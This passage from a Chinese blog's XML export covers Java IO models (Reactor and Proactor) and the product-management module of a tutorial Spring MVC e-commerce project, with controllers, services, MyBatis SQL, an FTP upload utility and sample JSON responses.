D也和B差不多，只是不需要隔会看看有没有鱼上钩，即不需要在鱼竿旁边守着，你可以去喝个茶，当有鱼上钩的时候，会受到上钩短信，你再去把鱼拉上来即可。 E是个有钱人，干脆雇了一个人帮他钓鱼，一旦那个人把鱼钓上来了，就给D发个短信。 两种高性能IO设计模式在传统的网络服务设计模式中，有两种比较经典的模式： 一种是 多线程，一种是线程池。 对于多线程模式，也就说来了client，服务器就会新建一个线程来处理该client的读写事件，如下图所示： 这种模式虽然处理起来简单方便，但是由于服务器为每个client的连接都采用一个线程去处理，使得资源占用非常大。因此，当连接数量达到上限时，再有用户请求连接，直接会导致资源瓶颈，严重的可能会直接导致服务器崩溃。 因此，为了解决这种一个线程对应一个客户端模式带来的问题，提出了采用线程池的方式，也就说创建一个固定大小的线程池，来一个客户端，就从线程池取一个空闲线程来处理，当客户端处理完读写操作之后，就交出对线程的占用。因此这样就避免为每一个客户端都要创建线程带来的资源浪费，使得线程可以重用。 但是线程池也有它的弊端，如果连接大多是长连接，因此可能会导致在一段时间内，线程池中的线程都被占用，那么当再有用户请求连接时，由于没有可用的空闲线程来处理，就会导致客户端连接失败，从而影响用户体验。因此，线程池比较适合大量的短连接应用。 因此便出现了下面的两种高性能IO设计模式：Reactor和Proactor。 在Reactor模式中，会先对每个client注册感兴趣的事件，然后有一个线程专门去轮询每个client是否有事件发生，当有事件发生时，便顺序处理每个事件，当所有事件处理完之后，便再转去继续轮询，如下图所示： 从这里可以看出，上面的五种IO模型中的多路复用IO就是采用Reactor模式。注意，上面的图中展示的 是顺序处理每个事件，当然为了提高事件处理速度，可以通过多线程或者线程池的方式来处理事件。 在Proactor模式中，当检测到有事件发生时，会新起一个异步操作，然后交由内核线程去处理，当内核线程完成IO操作之后，发送一个通知告知操作已完成，可以得知，异步IO模型采用的就是Proactor模式。 参考： https://blog.csdn.net/historyasamirror/article/details/5778378 https://www.cnblogs.com/dolphin0520/p/3916526.html https://blog.csdn.net/shimiso/article/details/24990499 https://troywu0.gitbooks.io/spark/content/java-io%E6%B5%81.html https://github.com/CyC2018/Interview-Notebook/blob/master/notes/Java%20IO.md]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8、商品管理模块]]></title>
    <url>%2F2018%2F07%2F21%2F8%E3%80%81%E5%95%86%E5%93%81%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[商品管理模块 1.新增OR更新产品123新增 http://localhost:8080/manage/product/save.do?categoryId=1&amp;name=三星洗衣机&amp;subtitle=三星大促销&amp;subImages=test.jpg,11.jpg,2.jpg,3.jpg&amp;detail=detailtext&amp;price=1000&amp;stock=100&amp;status=1更新 http://localhost:8080/manage/product/save.do?categoryId=1&amp;name=三星洗衣机&amp;subtitle=三星大促销&amp;subImages=test.jpg&amp;detail=detailtext&amp;price=1000&amp;stock=100&amp;status=1&amp;id=3 request1categoryId=1&amp;name=三星洗衣机&amp;subtitle=三星大促销&amp;mainImage=sss.jpg&amp;subImages=test.jpg&amp;detail=detailtext&amp;price=1000&amp;stock=100&amp;status=1&amp;id=3 success1234567891011&#123; &quot;status&quot;: 0, &quot;data&quot;: &quot;更新产品成功&quot;&#125;或&#123; &quot;status&quot;: 0, &quot;data&quot;: &quot;新增产品成功&quot;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;data&quot;: &quot;更新产品失败&quot;&#125; controller:12345678910111213@RequestMapping("save.do")@ResponseBodypublic ServerResponse productSave(HttpSession session, Product product)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return productService.saveOrUpdateProduct(product); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service是：12345678910111213141516171819202122232425public ServerResponse saveOrUpdateProduct(Product product)&#123; if(product != null)&#123; if(StringUtils.isNotBlank(product.getSubImages()))&#123; String[] subImageArray = product.getSubImages().split(","); if(subImageArray.length&gt;0)&#123; product.setMainImage(subImageArray[0]); &#125; &#125; //根据id判断是要更新还是新增 if(product.getId()!=null)&#123; int rowCount = productMapper.updateByPrimaryKey(product); if(rowCount&gt;0)&#123; return ServerResponse.createBySuccessMessage("更新产品成功"); &#125; return ServerResponse.createByErrorMessage("更新产品失败"); &#125;else &#123; int rowCount = productMapper.insert(product); if(rowCount&gt;0)&#123; return ServerResponse.createBySuccessMessage("新增产品成功"); &#125; return ServerResponse.createByErrorMessage("新增产品失败"); &#125; &#125; return ServerResponse.createByErrorMessage("新增或更新产品参数不正确");&#125; 2.产品上下架1http://localhost:8080/manage/product/set_sale_status.do?productId=1&amp;status=1 request12productIdstatus success1234&#123; &quot;status&quot;: 0, &quot;data&quot;: &quot;修改产品状态成功&quot;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;data&quot;: &quot;修改产品状态失败&quot;&#125; controller12345678910111213@RequestMapping("set_sale_status.do")@ResponseBodypublic ServerResponse setSaleStatus(HttpSession session, Integer productId,Integer status)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return productService.setSaleStatus(productId,status); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应service12345678910111213public ServerResponse&lt;String&gt; setSaleStatus(Integer productId,Integer status)&#123; if(productId == null || status == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),"参数错误"); &#125; Product product = new Product(); product.setId(productId); product.setStatus(status); int rowCount = productMapper.updateByPrimaryKeySelective(product); if(rowCount&gt;0)&#123; return ServerResponse.createBySuccessMessage("修改产品销售状态成功"); &#125; return ServerResponse.createByErrorMessage("修改产品销售状态失败");&#125; 3.产品详情1http://localhost:8080/manage/product/detail.do?productId=2 request1productId success12345678910111213141516171819&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 2, &quot;categoryId&quot;: 2, &quot;parentCategoryId&quot;:1, &quot;name&quot;: &quot;oppo R8&quot;, &quot;subtitle&quot;: &quot;oppo促销进行中&quot;, &quot;imageHost&quot;: &quot;http://img.happymmall.com/&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;subImages&quot;: &quot;[\&quot;mmall/aa.jpg\&quot;,\&quot;mmall/bb.jpg\&quot;,\&quot;mmall/cc.jpg\&quot;,\&quot;mmall/dd.jpg\&quot;,\&quot;mmall/ee.jpg\&quot;]&quot;, &quot;detail&quot;: &quot;richtext&quot;, &quot;price&quot;: 2999.11, &quot;stock&quot;: 71, &quot;status&quot;: 1, &quot;createTime&quot;: &quot;2016-11-20 14:21:53&quot;, &quot;updateTime&quot;: &quot;2016-11-20 14:21:53&quot; &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;没有权限&quot;&#125; controller12345678910111213@RequestMapping("detail.do")@ResponseBodypublic ServerResponse getDetail(HttpSession session, Integer productId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return productService.manageProductDetail(productId); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service：1234567891011public ServerResponse&lt;ProductDetailVo&gt; manageProductDetail(Integer productId)&#123; if(productId == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),"参数错误"); &#125; Product product = productMapper.selectByPrimaryKey(productId); if(product == null)&#123; return ServerResponse.createByErrorMessage("产品已下架或者删除"); &#125; ProductDetailVo productDetailVo = assembleProductDetailVo(product); return ServerResponse.createBySuccess(productDetailVo);&#125; 很显然，根据返回的结果来看，product对象是不够的，所以需要构建一个新的对象用来承载页面的展示。1234567891011121314151617@Datapublic class ProductDetailVo &#123; private Integer id; private Integer categoryId; private String name; private String subtitle; private String mainImage; private String subImages; private String detail; private BigDecimal price; private Integer stock; private Integer status; private String createTime; private String updateTime; private String imageHost; private Integer parentCategoryId;&#125; 用product来构造productDetailVo:1234567891011121314151617181920212223242526272829303132private ProductDetailVo assembleProductDetailVo(Product product)&#123; ProductDetailVo productDetailVo = new ProductDetailVo(); productDetailVo.setId(product.getId()); productDetailVo.setSubtitle(product.getSubtitle()); productDetailVo.setMainImage(product.getMainImage()); productDetailVo.setSubImages(product.getSubImages()); productDetailVo.setPrice(product.getPrice()); productDetailVo.setCategoryId(product.getCategoryId()); productDetailVo.setDetail(product.getDetail()); productDetailVo.setName(product.getName()); productDetailVo.setStatus(product.getStatus()); productDetailVo.setStock(product.getStock()); //imageHost productDetailVo.setImageHost(PropertiesUtil.getProperty("ftp.server.http.prefix","http://image.snail.com/")); //parentCategoryId Category category = categoryMapper.selectByPrimaryKey(product.getCategoryId()); if(category == null)&#123; productDetailVo.setParentCategoryId(0); &#125;else &#123; productDetailVo.setParentCategoryId(category.getParentId()); &#125; //createTime productDetailVo.setCreateTime(DateTimeUtil.dateToStr(product.getCreateTime())); //updateTime productDetailVo.setUpdateTime(DateTimeUtil.dateToStr(product.getUpdateTime())); return productDetailVo;&#125; 注意到这里的时间是需要处理一下的，这里用joda-time工具来处理：1234567891011121314151617181920212223242526272829303132333435363738394041424344public class DateTimeUtil &#123; //joda-time //str-&gt;Date //Date-&gt;str public static final String STANDARD_FORMAT = "yyyy-MM-dd HH:mm:ss"; public static Date strToDate(String dateTimeStr, String formatStr)&#123; DateTimeFormatter dateTimeFormatter = DateTimeFormat.forPattern(formatStr); DateTime dateTime = dateTimeFormatter.parseDateTime(dateTimeStr); return dateTime.toDate(); &#125; public static String dateToStr(Date date,String formatStr)&#123; if(date == null)&#123; return StringUtils.EMPTY; &#125; DateTime dateTime = new DateTime(date); return dateTime.toString(formatStr); &#125; //固定好格式 public static Date strToDate(String dateTimeStr)&#123; DateTimeFormatter dateTimeFormatter = DateTimeFormat.forPattern(STANDARD_FORMAT); DateTime dateTime = dateTimeFormatter.parseDateTime(dateTimeStr); return dateTime.toDate(); &#125; public static String dateToStr(Date date)&#123; if(date == null)&#123; return StringUtils.EMPTY; &#125; DateTime dateTime = new DateTime(date); return dateTime.toString(STANDARD_FORMAT); &#125; public static void main(String[] args) &#123; System.out.println(DateTimeUtil.dateToStr(new Date(),"yyyy-MM-dd HH:mm:ss")); System.out.println(DateTimeUtil.strToDate("2010-01-01 11:11:11","yyyy-MM-dd HH:mm:ss")); &#125;&#125; 4.产品list1http://localhost:8080/manage/product/list.do request12pageNum(default=1)pageSize(default=10) success123456789101112131415161718192021222324252627282930313233343536373839404142434445&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 10, &quot;size&quot;: 2, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 2, &quot;total&quot;: 2, &quot;pages&quot;: 1, &quot;list&quot;: [ &#123; &quot;id&quot;: 1, &quot;categoryId&quot;: 3, &quot;name&quot;: &quot;iphone7&quot;, &quot;subtitle&quot;: &quot;双十一促销&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;status&quot;:1, &quot;price&quot;: 7199.22 &#125;, &#123; &quot;id&quot;: 2, &quot;categoryId&quot;: 2, &quot;name&quot;: &quot;oppo R8&quot;, &quot;subtitle&quot;: &quot;oppo促销进行中&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;status&quot;:1, &quot;price&quot;: 2999.11 &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 0, &quot;lastPage&quot;: 1, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: true, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: false, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1 ] &#125;&#125; fail1234&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,请登录&quot;&#125; controller123456789101112131415@RequestMapping("list.do")@ResponseBodypublic ServerResponse getList(HttpSession session, @RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize" , defaultValue = "10") int pageSize)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return productService.getProductList(pageNum,pageSize); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service是：12345678910111213public ServerResponse&lt;PageInfo&gt; getProductList(int pageNum,int pageSize)&#123; PageHelper.startPage(pageNum,pageSize); //SELECT &lt;include refid="Base_Column_List"/&gt; form mmall_product ORDER BY id ASC List&lt;Product&gt; productList = productMapper.selectList(); List&lt;ProductListVo&gt; productListVoList = Lists.newArrayList(); for(Product productItem:productList)&#123; ProductListVo productListVo = assembleProcuListVo(productItem); productListVoList.add(productListVo); &#125; PageInfo pageResult = new PageInfo(productList); pageResult.setList(productListVoList); return ServerResponse.createBySuccess(pageResult);&#125; 我们也注意到，产品列表的信息不需要product中所有的属性，所以这里还要构建一个对象：1234567891011@Datapublic class ProductListVo &#123; private Integer id; private Integer categoryId; private String name; private String subtitle; private String mainImage; private BigDecimal price; private Integer status; private String imageHost;&#125; 我们来构建这个对象：123456789101112private ProductListVo assembleProcuListVo(Product product)&#123; ProductListVo productListVo = new ProductListVo(); productListVo.setId(product.getId()); productListVo.setSubtitle(product.getSubtitle()); productListVo.setMainImage(product.getMainImage()); productListVo.setPrice(product.getPrice()); productListVo.setCategoryId(product.getCategoryId()); productListVo.setName(product.getName()); productListVo.setStatus(product.getStatus()); productListVo.setImageHost(PropertiesUtil.getProperty(&quot;ftp.server.http.prefix&quot;,&quot;http://image.snail.com/&quot;)); return productListVo;&#125; 5.产品搜索12http://localhost:8080/manage/product/search.do?productName=phttp://localhost:8080/manage/product/search.do?productId=1 request1234productNameproductIdpageNum(default=1)pageSize(default=10) success1234567891011121314151617181920212223242526272829303132333435&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 10, &quot;size&quot;: 1, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 1, &quot;total&quot;: 1, &quot;pages&quot;: 1, &quot;list&quot;: [ &#123; &quot;id&quot;: 1, &quot;categoryId&quot;: 3, &quot;name&quot;: &quot;iphone7&quot;, &quot;subtitle&quot;: &quot;双十一促销&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;price&quot;: 7199.22 &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 0, &quot;lastPage&quot;: 1, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: true, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: false, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1 ] &#125;&#125; fail1234&#123; &quot;status&quot;: 10, &quot;msg&quot;: &quot;用户未登录,请登录&quot;&#125; controller1234567891011121314151617@RequestMapping("search.do")@ResponseBodypublic ServerResponse productSearch(HttpSession session, String productName, Integer productId, @RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize" , defaultValue = "10") int pageSize)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; return productService.searchProduct(productName,productId,pageNum,pageSize); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 对应的service：123456789101112131415public ServerResponse&lt;PageInfo&gt; searchProduct(String productName,Integer productId,int pageNum,int pageSize)&#123; PageHelper.startPage(pageNum,pageSize); if(StringUtils.isNotBlank(productName))&#123; productName = new StringBuilder().append("%").append(productName).append("%").toString(); &#125; List&lt;Product&gt; productList = productMapper.selectByNameAndProductId(productName,productId); List&lt;ProductListVo&gt; productListVoList = Lists.newArrayList(); for(Product productItem:productList)&#123; ProductListVo productListVo = assembleProcuListVo(productItem); productListVoList.add(productListVo); &#125; PageInfo pageResult = new PageInfo(productList); pageResult.setList(productListVoList); return ServerResponse.createBySuccess(pageResult);&#125; 这里需要注意一下sql查询语句：123456789101112&lt;select id="selectByNameAndProductId" resultMap="BaseResultMap" parameterType="map"&gt;SELECT &lt;include refid="Base_Column_List"/&gt;from mmall_product&lt;where&gt; &lt;if test="productName != null"&gt; and name like #&#123;productName&#125; &lt;/if&gt; &lt;if test="productId != null"&gt; and id = #&#123;productId&#125; &lt;/if&gt;&lt;/where&gt;&lt;/select&gt; 标签可以智能地将and适合地替代为where。比where 1=1这种写法要优雅很多。 6.图片上传1/manage/product/upload.do request1234&lt;form name="form2" action="/manage/product/upload.do" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="upload_file"&gt; &lt;input type="submit" value="upload"/&gt;&lt;/form&gt; success1234567&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;uri&quot;: &quot;e6604558-c0ff-41b9-b6e1-30787a1e3412.jpg&quot;, &quot;url&quot;: &quot;http://img.happymmall.com/e6604558-c0ff-41b9-b6e1-30787a1e3412.jpg&quot; &#125;&#125; fail1status!=0的时候 controller普通的文件上传： 12345678910111213141516171819@RequestMapping("upload.do")@ResponseBodypublic ServerResponse upload(HttpSession session,@RequestParam(value = "upload_file",required = false) MultipartFile file, HttpServletRequest request)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),"用户未登陆，请登录"); &#125; if(userService.checkAdminRole(user).isSuccess())&#123; String path = request.getSession().getServletContext().getRealPath("upload"); String targetFileName = fileService.upload(file,path); String url = PropertiesUtil.getProperty("ftp.server.http.prefix")+targetFileName; Map fileMap = Maps.newHashMap(); fileMap.put("uri",targetFileName); fileMap.put("url",url); return ServerResponse.createBySuccess(fileMap); &#125;else &#123; return ServerResponse.createByErrorMessage("需要管理员权限"); &#125;&#125; 相应的service是：1234567891011121314151617181920212223242526272829303132@Service@Slf4jpublic class FileServiceImpl implements FileService&#123; public String upload(MultipartFile file,String path)&#123; //文件的原始名 String fileName = file.getOriginalFilename(); //获取扩展名 String fileExtensionName = fileName.substring(fileName.lastIndexOf(".")+1); //上传的新文件名 String uploadFileName = UUID.randomUUID().toString()+"."+fileExtensionName; log.info("开始上传文件，上传文件的文件名&#123;&#125;，上传的路径&#123;&#125;,新文件名&#123;&#125;",fileName,path,uploadFileName); //创建上传目录 File fileDir = new File(path); if(!fileDir.exists())&#123; fileDir.setWritable(true); fileDir.mkdirs(); &#125; File targetFile = new File(path,uploadFileName); try &#123; //文件上传到tomcat服务器 file.transferTo(targetFile); //文件上传到ftp服务器 FtpUtil.uploadFile(Lists.newArrayList(targetFile)); //删除tomcat服务器中临时文件 targetFile.delete(); &#125; catch (IOException e) &#123; log.error("上传文件异常",e); return null; &#125; return targetFile.getName(); &#125;&#125; 这里写一个ftp上传的工具类：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071@Slf4j@Datapublic class FtpUtil &#123; private static String ftpIp = PropertiesUtil.getProperty("ftp.server.ip"); private static String ftpUser = PropertiesUtil.getProperty("ftp.user"); private static String ftpPass = PropertiesUtil.getProperty("ftp.pass"); public FtpUtil(String ip,int port,String user,String pwd)&#123; this.ip = ip; this.port = port; this.user = user; this.pwd = pwd; &#125; public static boolean uploadFile(List&lt;File&gt; fileList) throws IOException &#123; FtpUtil ftpUtil = new FtpUtil(ftpIp,21,ftpUser,ftpPass); log.info("开始连接ftp服务器"); boolean result = ftpUtil.uploadFile("img",fileList); log.info("开始连接ftp服务器,结束上传,上传结果:&#123;&#125;"); return result; &#125; private boolean uploadFile(String remotePath,List&lt;File&gt; fileList) throws IOException &#123; boolean uploaded = true; FileInputStream fis = null; //连接FTP服务器 if(connectServer(this.ip,this.port,this.user,this.pwd))&#123; try &#123; ftpClient.changeWorkingDirectory(remotePath); ftpClient.setBufferSize(1024); ftpClient.setControlEncoding("UTF-8"); ftpClient.setFileType(FTPClient.BINARY_FILE_TYPE); ftpClient.enterLocalPassiveMode(); for(File fileItem : fileList)&#123; fis = new FileInputStream(fileItem); ftpClient.storeFile(fileItem.getName(),fis); &#125; &#125; catch (IOException e) &#123; log.error("上传文件异常",e); uploaded = false; e.printStackTrace(); &#125; finally &#123; fis.close(); ftpClient.disconnect(); &#125; &#125; return uploaded; &#125; private boolean connectServer(String ip,int port,String user,String pwd)&#123; boolean isSuccess = false; ftpClient = new FTPClient(); try &#123; ftpClient.connect(ip); isSuccess = ftpClient.login(user,pwd); &#125; catch (IOException e) &#123; log.error("连接FTP服务器异常",e); &#125; return isSuccess; &#125; private String ip; private int port; private String user; private String pwd; private FTPClient ftpClient;&#125; 另外一个是富文本上传图片，他所要求的返回格式是：12345&#123; &quot;success&quot;: true/false, &quot;msg&quot;: &quot;error message&quot;, &quot;file_path&quot;: &quot;[real file path]&quot;&#125; 所以相应的controller是：123456789101112131415161718192021222324252627282930@RequestMapping("richtext_img_upload.do")@ResponseBodypublic Map richtextImgUpload(HttpSession session, @RequestParam(value = "upload_file",required = false) MultipartFile file, HttpServletRequest request, HttpServletResponse response)&#123; Map resultMap = Maps.newHashMap(); User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user==null)&#123; resultMap.put("success",false); resultMap.put("msg","请登录管理员"); return resultMap; &#125; if(userService.checkAdminRole(user).isSuccess())&#123; String path = request.getSession().getServletContext().getRealPath("upload"); String targetFileName = fileService.upload(file,path); if(StringUtils.isBlank(targetFileName))&#123; resultMap.put("success",false); resultMap.put("msg","上传失败"); return resultMap; &#125; String url = PropertiesUtil.getProperty("ftp.server.http.prefix")+targetFileName; resultMap.put("success",true); resultMap.put("msg","上传成功"); resultMap.put("file_path",url); response.addHeader("Access-Control-Allow-Headers","X-File-Name"); return resultMap; &#125;else &#123; resultMap.put("success",false); resultMap.put("msg","无权限操作"); return resultMap; &#125;&#125; 这个测试一下，需要一个页面index.html：123456789101112131415161718192021222324252627282930&lt;%@ page language="java" contentType="text/html; charset=UTF-8" %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!&lt;/h2&gt;springmvc上传文件&lt;form name="form1" action="/manage/product/upload.do" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="upload_file" /&gt; &lt;input type="submit" value="springmvc上传文件" /&gt;&lt;/form&gt;富文本图片上传文件&lt;form name="form2" action="/manage/product/richtext_img_upload.do" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="upload_file" /&gt; &lt;input type="submit" value="富文本图片上传文件" /&gt;&lt;/form&gt;登陆&lt;form name="form3" action="/user/login.do" method="post"&gt; &lt;input type="text" name="username" /&gt; &lt;input type="text" name="password" /&gt; &lt;input type="submit" value="登陆" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 这里的登陆是因为必须在用户登陆的情况下并且是管理员才可以上传图片，所以这里需要先登录一下管理员账号才能演示。另外，所有的配置都指向本机的地址和数据库。在windows下启动ftp server（前面已经详细讲过windows下ftp服务器的搭建了）。这样就可以直接测试了。 门户产品1.产品detail1http://localhost:8080/product/detail.do?productId=2 request1productId success1234567891011121314151617&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 2, &quot;categoryId&quot;: 2, &quot;name&quot;: &quot;oppo R8&quot;, &quot;subtitle&quot;: &quot;oppo促销进行中&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;subImages&quot;: &quot;[\&quot;mmall/aa.jpg\&quot;,\&quot;mmall/bb.jpg\&quot;,\&quot;mmall/cc.jpg\&quot;,\&quot;mmall/dd.jpg\&quot;,\&quot;mmall/ee.jpg\&quot;]&quot;, &quot;detail&quot;: &quot;richtext&quot;, &quot;price&quot;: 2999.11, &quot;stock&quot;: 71, &quot;status&quot;: 1, &quot;createTime&quot;: &quot;2016-11-20 14:21:53&quot;, &quot;updateTime&quot;: &quot;2016-11-20 14:21:53&quot; &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;该商品已下架或删除&quot;&#125; controller12345@RequestMapping("detail.do")@ResponseBodypublic ServerResponse&lt;ProductDetailVo&gt; detail(Integer productId)&#123; return productService.getProductDetail(productId);&#125; 对应的service其实与后台的详情方法是一样的，只是多了一个状态的判断，只有在架的商品才会展示出来。 1234567891011121314public ServerResponse&lt;ProductDetailVo&gt; getProductDetail(Integer productId)&#123; if(productId == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),&quot;参数错误&quot;); &#125; Product product = productMapper.selectByPrimaryKey(productId); if(product == null)&#123; return ServerResponse.createByErrorMessage(&quot;产品已下架或者删除&quot;); &#125; if(product.getStatus() != Constants.ProductStatusEnum.ON_SALE.getCode())&#123; return ServerResponse.createByErrorMessage(&quot;产品已下架或者删除&quot;); &#125; ProductDetailVo productDetailVo = assembleProductDetailVo(product); return ServerResponse.createBySuccess(productDetailVo);&#125; 2.产品搜索及动态排序List1http://localhost:8080/product/list.do?keyword=&amp;categoryId=1&amp;orderBy=price_desc request12345categoryIdkeywordpageNum(default=1)pageSize(default=10)orderBy(default=&quot;&quot;)：排序参数：例如price_desc，price_asc success123456789101112131415161718192021222324252627282930313233343536373839404142434445&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 10, &quot;size&quot;: 2, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 2, &quot;total&quot;: 2, &quot;pages&quot;: 1, &quot;list&quot;: [ &#123; &quot;id&quot;: 1, &quot;categoryId&quot;: 3, &quot;name&quot;: &quot;iphone7&quot;, &quot;subtitle&quot;: &quot;双十一促销&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;status&quot;:1, &quot;price&quot;: 7199.22 &#125;, &#123; &quot;id&quot;: 2, &quot;categoryId&quot;: 2, &quot;name&quot;: &quot;oppo R8&quot;, &quot;subtitle&quot;: &quot;oppo促销进行中&quot;, &quot;mainImage&quot;: &quot;mainimage.jpg&quot;, &quot;status&quot;:1, &quot;price&quot;: 2999.11 &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 0, &quot;lastPage&quot;: 1, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: true, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: false, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1 ] &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;参数错误&quot;&#125; controller123456789@RequestMapping("list.do")@ResponseBodypublic ServerResponse&lt;PageInfo&gt; list(@RequestParam(value = "keyword",required = false) String keyword, @RequestParam(value = "categoryId",required = false)Integer categoryId, @RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize",defaultValue = "10") int pageSize, @RequestParam(value = "orderBy",defaultValue = "")String orderBy)&#123; return productService.getProductByKeywordCategory(keyword,categoryId,orderBy,pageNum,pageSize);&#125; 对应的service是：1234567891011121314151617181920212223242526272829303132333435363738394041424344public ServerResponse&lt;PageInfo&gt; getProductByKeywordCategory(String keyword,Integer categoryId,String orderBy,int pageNum,int pageSize)&#123; //先判断参数是否都为空 if(StringUtils.isBlank(keyword) &amp;&amp; categoryId == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),ResponseEnum.ILLEGAL_ARGUMENT.getDesc()); &#125; //搜索的品类id级别比较高时，下面会有若干子品类，所以这里用来存放所有子平类的id List&lt;Integer&gt; categoryIdList = Lists.newArrayList(); if(categoryId != null)&#123; Category category = categoryMapper.selectByPrimaryKey(categoryId); if(category == null &amp;&amp; StringUtils.isBlank(keyword))&#123; //直接返回空即可，不报错 PageHelper.startPage(pageNum,pageSize); List&lt;ProductListVo&gt; productListVoList = Lists.newArrayList(); PageInfo pageInfo = new PageInfo(productListVoList); return ServerResponse.createBySuccess(pageInfo); &#125; //递归查询出所有的品类id categoryIdList = categoryService.selectCategoryAndDeepChildrenById(category.getId()).getData(); &#125; //关键字模糊查询 if(StringUtils.isNotBlank(keyword))&#123; keyword = new StringBuilder().append("%").append(keyword).append("%").toString(); &#125; //开始分页 PageHelper.startPage(pageNum,pageSize); if(StringUtils.isNotBlank(orderBy))&#123; //接口类型带代替枚举 if(Constants.ProductListOrderBy.PRICE_ASC_DESC.contains(orderBy))&#123; String[] orderByArray = orderBy.split("_"); //将排序拼接到后面 PageHelper.orderBy(orderByArray[0]+" "+orderByArray[1]); &#125; &#125; //in查询出所有品类下的产品 List&lt;Product&gt; productList = productMapper.selectByNameAndCategoryIds(StringUtils.isBlank(keyword)?null:keyword,categoryIdList.size()==0?null:categoryIdList); List&lt;ProductListVo&gt; productListVoList = Lists.newArrayList(); for(Product productItem:productList)&#123; ProductListVo productListVo = assembleProcuListVo(productItem); productListVoList.add(productListVo); &#125; 